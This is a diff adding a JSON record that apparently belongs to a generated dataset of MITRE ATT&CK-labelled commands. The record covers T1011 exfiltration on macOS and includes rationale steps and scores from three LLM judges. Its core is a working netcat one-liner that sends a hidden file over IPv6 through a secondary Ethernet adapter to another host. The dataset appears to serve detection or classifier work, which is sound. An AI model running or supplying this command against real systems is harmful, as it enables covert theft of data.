@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "nc -6 -s \"$(ipconfig getv6ifaddr en5)\" \"fe80::2:abcd:7%en5\" 53127 < /Users/Shared/.cache.bin",
+  "explanation": "Forces exfiltration over a non-primary, often dormant USB/Thunderbolt Ethernet adapter (en5) via IPv6 TCP on an uncommon port, consistent with T1011 by using an alternate physical medium.",
+  "rationale_steps": [
+    "Use ipconfig to fetch the IPv6 address of the auxiliary Ethernet interface en5.",
+    "Bind netcat's source to en5's address to avoid the primary network path.",
+    "Exfiltrate data over IPv6 TCP to a link-local peer on a high-numbered port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-7a6bf8eb-3cfd2e08",
+  "source_prompt_hash": "7a6bf8eb",
+  "timestamp_utc": "2025-09-30T08:23:23.913402Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed with valid nc flags (-6, -s), correct quoting (including IPv6 scope), and proper input redirection.",
+        "semantic_score": 4,
+        "semantic_justification": "Plausibly exfiltrates the file over IPv6 TCP bound to en5 toward a link-local peer, aligning with automated/scriptable exfiltration, though it lacks scheduling/packaging and requires a listening peer on that interface.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T03:01:47.090516Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags for netcat, and correct command structure for redirecting file content.",
+        "semantic_score": 5,
+        "semantic_justification": "The command correctly implements automated exfiltration by using netcat to transfer a file over IPv6 via a specific network interface (en5) to an external destination on an uncommon port (53127), which aligns perfectly with the T1011 technique.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T03:01:50.174695Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid flags, balanced quotes, correct command substitution for the source IP, and proper IPv6 link-local address formatting for the destination.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly uses `nc` to transfer data over IPv6 on the specified `en5` interface via an uncommon port, which aligns with the exfiltration explanation, but the link-local destination address restricts the target to a directly connected device rather than a globally routable 'external location'.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T05:37:46.763427Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
